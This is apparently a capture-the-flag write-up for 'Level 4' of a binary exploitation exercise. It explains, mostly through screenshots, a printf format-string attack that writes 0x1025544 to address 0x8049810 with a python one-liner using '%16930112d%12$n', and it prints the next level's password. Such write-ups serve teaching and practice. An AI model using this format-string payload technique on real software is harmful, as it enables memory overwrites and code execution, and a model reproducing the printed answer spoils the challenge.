### Level 4

#### Basic Recon

![](./pics/1.png)
![](./pics/2.png)

again there's call to printf and there's those functions `n` and `p` maybe there's something going on there.

![](./pics/3.png)

there's that `system` function call in `n` that's our target now.

![](./pics/4.png)
![](./pics/5.png)
![](./pics/6.png)
![](./pics/7.png)

![](./pics/8.png)
![](./pics/8_1.png)

![](./pics/9.png)
![](./pics/10.png)
![](./pics/11.png)
![](./pics/12.png)

and it is the same argument that `p` will use
![](./pics/13.png)

now I want p to store the value `0x1025544` in the location 
`0x8049810`
![](./pics/14.png)
![](./pics/15.png)
![](./pics/16.png)
![](./pics/17.png)
![](./pics/18.png)
![](./pics/19.png)

well we may print that list of charcters `0x1025544` to exact well that's a lot and other probelm printf will start printing our input, but our input can not be big, because we are using `fgets` instead of `gets`, but hold on who says that we need to input that long string we can ask print to print that big string as list of string like this

```c
#include <stdio.h>

int main()
{
    int a = 9;

    printf("%10d", a);
}
```

![](./pics/20.png)

as you can see it will fill the rest with spaces

```py
python -c "from __future__ import print_function; print('\x10\x98\x04\x08' + '%16930112d%12\$n')"

```

why `16930112` well this is just `0x1025544-4` and that 4 is the first 4 charcters which reprsent the address

![](./pics/20.png)
![](./pics/21.png)

#### Password for level 5

```
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```

#### Ideas that I tried

well I tried to write each byte seperatly how? well the idea is to put 4 address on the stack so printf would use them to store what was printed so that means I tried to write the bytes `0x01` `0x02` `0x55` `0x44`, but the problem is when I tried it's hard to write the first byte `0x01`, because printf should write the value 1 in the first location but that's not possible because the smallest value that printf can write in this case is 4, 4 because that the size of the first location